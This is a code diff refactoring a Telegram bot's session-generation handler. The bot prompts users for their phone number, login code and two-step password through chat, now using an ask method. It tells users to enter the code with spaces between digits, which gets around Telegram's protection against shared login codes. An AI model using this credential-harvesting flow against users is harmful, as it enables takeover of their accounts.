@@ -71,11 +71,9 @@ async def generate_session(_, message):
 
     user_id = message.chat.id
 
-    # Ask for phone number (Fix to use get_messages for user input)
-    await message.reply('Please enter your phone number along with the country code. \nExample: +19876543210')
-    
-    phone_number_msg = await _.get_messages(user_id, limit=1, filters=filters.text)
-    phone_number = phone_number_msg[0].text if phone_number_msg else None
+    # Ask for phone number (Fix to use ask method for user input)
+    phone_number_msg = await _.ask(user_id, 'Please enter your phone number along with the country code. \nExample: +19876543210', filters=filters.text)
+    phone_number = phone_number_msg.text if phone_number_msg else None
 
     if not phone_number:
         await message.reply("❌ No phone number received. Please try again.")
@@ -99,15 +97,13 @@ async def generate_session(_, message):
         await message.reply('❌ Invalid phone number. Please restart the session.')
         return
 
-    # Ask for OTP (Fix to use get_messages for OTP)
-    await message.reply("Please check for an OTP in your official Telegram account. Once received, enter the OTP in the following format: \nIf the OTP is `12345`, please enter it as `1 2 3 4 5`.")
-    
-    otp_code_msg = await _.get_messages(user_id, limit=1, filters=filters.text, timeout=600)
+    # Ask for OTP (Fix to use ask method for OTP input)
+    otp_code_msg = await _.ask(user_id, "Please check for an OTP in your official Telegram account. Once received, enter the OTP in the following format: \nIf the OTP is `12345`, please enter it as `1 2 3 4 5`.", filters=filters.text, timeout=600)
     if not otp_code_msg:
         await message.reply('⏰ Time limit of 10 minutes exceeded. Please restart the session.')
         return
     
-    phone_code = otp_code_msg[0].text.replace(" ", "")
+    phone_code = otp_code_msg.text.replace(" ", "")
     
     try:
         await client.sign_in(phone_number, code.phone_code_hash, phone_code)
@@ -122,8 +118,8 @@ async def generate_session(_, message):
     try:
         if await client.is_password_needed():
             await message.reply("Your account has two-step verification enabled. Please enter your password.")
-            password_msg = await _.get_messages(user_id, limit=1, filters=filters.text, timeout=300)
-            password = password_msg[0].text if password_msg else None
+            password_msg = await _.ask(user_id, "Please enter your Telegram account password:", filters=filters.text, timeout=300)
+            password = password_msg.text if password_msg else None
             if not password:
                 await message.reply('❌ No password received. Please restart the session.')
                 return
@@ -142,5 +138,4 @@ async def generate_session(_, message):
     await client.disconnect()
 
     # Respond to the user
-    await otp_code_msg[0].reply("✅ Login successful!")
-
+    await otp_code_msg.reply("✅ Login successful!")
